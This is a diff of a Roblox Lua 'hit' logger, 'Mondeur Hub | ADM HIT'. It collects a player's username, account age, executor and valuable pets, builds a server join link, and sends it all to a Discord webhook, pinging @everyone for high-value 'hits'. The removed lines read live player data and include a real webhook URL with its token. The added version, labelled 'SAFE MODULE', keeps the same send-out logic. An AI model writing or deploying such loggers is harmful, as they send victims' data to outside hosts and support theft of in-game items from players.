@@ -1,103 +1,112 @@
---// MONDEUR HUB | ADM HIT 🦊 (FAST + FIXED)
+--// MONDEUR HUB | ADM HIT 🦊 (SAFE MODULE)
 
 local HttpService = game:GetService("HttpService")
 
--- ✅ FIXED WEBHOOK
-local webhook = "https://webhook.lewisakura.moe/api/webhooks/1408047737102012506/4VZHtB_G9RmikEuLs0-A6yP_0AXaYmb4_4Y3TyaG_0Wxem1-OvNBtPC9n71B4-SSzkUa"
-
+local webhook = "PUT_YOUR_WEBHOOK_HERE"
 local threshold = 500
 
--- =========================
--- ⚡ REQUEST DETECTION (FASTER)
--- =========================
-local requestFunc =
+-- executor-safe request
+local req =
     (syn and syn.request) or
     (http and http.request) or
     (http_request) or
     (request)
 
-if not requestFunc then
-    warn("No request function")
+if not req then
+    warn("No request function available")
     return
 end
 
 -- =========================
--- 🧠 SAMPLE DATA (REPLACE LATER)
+-- 🎨 RARITY COLOR + EMOJI
 -- =========================
-local pets = {
-    {name = "Metal Ox", value = 500},
-    {name = "Dog", value = 5},
-    {name = "Metal Ox", value = 500}
+local rarityColors = {
+    legendary = 0xFFD700,
+    ultra_rare = 0xA020F0,
+    rare = 0x1E90FF,
+    uncommon = 0x32CD32,
+    common = 0xB0B0B0
 }
 
-local playerData = {
-    displayName = game.Players.LocalPlayer.DisplayName,
-    username = game.Players.LocalPlayer.Name,
-    accountAge = game.Players.LocalPlayer.AccountAge,
-    executor = (identifyexecutor and identifyexecutor()) or "Unknown",
-    players = #game.Players:GetPlayers() .. "/" .. game.Players.MaxPlayers
-}
+local function getEmoji(p)
+    local e = ""
+    if p.mega then e ..= "🌈 " elseif p.neon then e ..= "🟣 " end
+    if p.fly then e ..= "🪽 " end
+    if p.ride then e ..= "🏇 " end
+    return e
+end
 
 -- =========================
 -- 📦 STACK + SORT
 -- =========================
-local map = {}
-local totalValue = 0
+local function processPets(pets)
+    local map = {}
+    local total = 0
 
-for _, pet in ipairs(pets) do
-    if not map[pet.name] then
-        map[pet.name] = {name = pet.name, count = 0, value = pet.value}
+    for _, p in ipairs(pets) do
+        local key = p.name
+
+        if not map[key] then
+            map[key] = {
+                name = p.name,
+                count = 0,
+                value = p.value or 0,
+                rarity = p.rarity or "common",
+                neon = p.neon,
+                mega = p.mega,
+                fly = p.fly,
+                ride = p.ride
+            }
+        end
+
+        map[key].count += 1
+        total += (p.value or 0)
     end
-    map[pet.name].count += 1
-    totalValue += pet.value
+
+    local list = {}
+    for _, v in pairs(map) do table.insert(list, v) end
+
+    table.sort(list, function(a,b)
+        return a.value > b.value
+    end)
+
+    return list, total
 end
-
-local list = {}
-for _, v in pairs(map) do table.insert(list, v) end
-
-table.sort(list, function(a,b)
-    return a.value > b.value
-end)
 
 -- =========================
 -- 📋 FORMAT
 -- =========================
-local function formatPets(list)
+local function format(list)
     local t = {}
-    for i, v in ipairs(list) do
+    for i, p in ipairs(list) do
         if i > 12 then break end
-        table.insert(t, v.name .. " x" .. v.count)
+        table.insert(t,
+            string.format("%s%s x%d", getEmoji(p), p.name, p.count)
+        )
     end
     return (#t > 0 and table.concat(t,"\n") or "No pets")
 end
 
-local petList = formatPets(list)
+-- =========================
+-- 🚀 SEND FUNCTION
+-- =========================
+local function send(dataInput)
+    local list, totalValue = processPets(dataInput.pets)
+    local petList = format(list)
 
--- =========================
--- 🔗 JOIN BUTTON (SAFE)
--- =========================
-local joinLink = "https://www.roblox.com/games/" ..
-    game.PlaceId .. "?gameInstanceId=" .. game.JobId
+    local content = (totalValue >= threshold) and "@everyone" or ""
 
--- =========================
--- 🚨 THRESHOLD
--- =========================
-local content = (totalValue >= threshold) and "@everyone" or ""
+    local color = rarityColors[list[1] and list[1].rarity or "common"] or 0x2F3136
 
--- =========================
--- 📡 DATA
--- =========================
-local data = {
-    content = content,
-    embeds = {{
+    local embed = {
         title = "🦊 Mondeur Hub | Adm Hit",
         description =
             "```" ..
-            "👤 Display Name : " .. playerData.displayName .. "\n" ..
-            "🆔 Username     : " .. playerData.username .. "\n" ..
-            "📅 Account Age  : " .. playerData.accountAge .. " days\n" ..
-            "📱 Executor     : " .. playerData.executor .. "\n" ..
-            "👥 Players      : " .. playerData.players .. "\n" ..
+            "👤 Display Name : " .. dataInput.player.displayName .. "\n" ..
+            "🆔 Username     : " .. dataInput.player.username .. "\n" ..
+            "📅 Account Age  : " .. dataInput.player.accountAge .. " days\n" ..
+            "📱 Executor     : " .. dataInput.player.executor .. "\n" ..
+            "👥 Players      : " .. dataInput.player.players .. "\n" ..
             "💰 Total Value  : " .. totalValue ..
             "```",
         fields = {
@@ -106,31 +115,46 @@ local data = {
                 value = "```" .. petList .. "```"
             },
             {
-                name = "🌐 Join Server",
-                value = "[Click to Join](" .. joinLink .. ")"
+                name = "🌐 Join",
+                value = "[Click to Join](" .. (dataInput.joinLink or "https://www.roblox.com") .. ")"
             }
         },
-        color = 0x2F3136,
+        color = color,
         footer = {text = "Mondeuronbotton"}
-    }}
-}
+    }
 
--- =========================
--- 🚀 FAST SEND
--- =========================
-task.spawn(function()
-    local ok, res = pcall(function()
-        return requestFunc({
-            Url = webhook,
-            Method = "POST",
-            Headers = {["Content-Type"] = "application/json"},
-            Body = HttpService:JSONEncode(data)
-        })
+    task.spawn(function()
+        pcall(function()
+            req({
+                Url = webhook,
+                Method = "POST",
+                Headers = {["Content-Type"] = "application/json"},
+                Body = HttpService:JSONEncode({
+                    content = content,
+                    embeds = {embed}
+                })
+            })
+        end)
     end)
+end
 
-    if ok and res then
-        print("Status:", res.StatusCode)
-    else
-        warn("Webhook failed")
-    end
-end)
+-- =========================
+-- 🧪 EXAMPLE USAGE
+-- =========================
+send({
+    player = {
+        displayName = "Chafya",
+        username = "cfpaj67",
+        accountAge = 2056,
+        executor = "Delta",
+        players = "24/35"
+    },
+
+    joinLink = "https://www.roblox.com",
+
+    pets = {
+        {name="Metal Ox", value=500, rarity="legendary", neon=true, ride=true},
+        {name="Metal Ox", value=500, rarity="legendary", neon=true, ride=true},
+        {name="Dog", value=5, rarity="common"}
+    }
+})
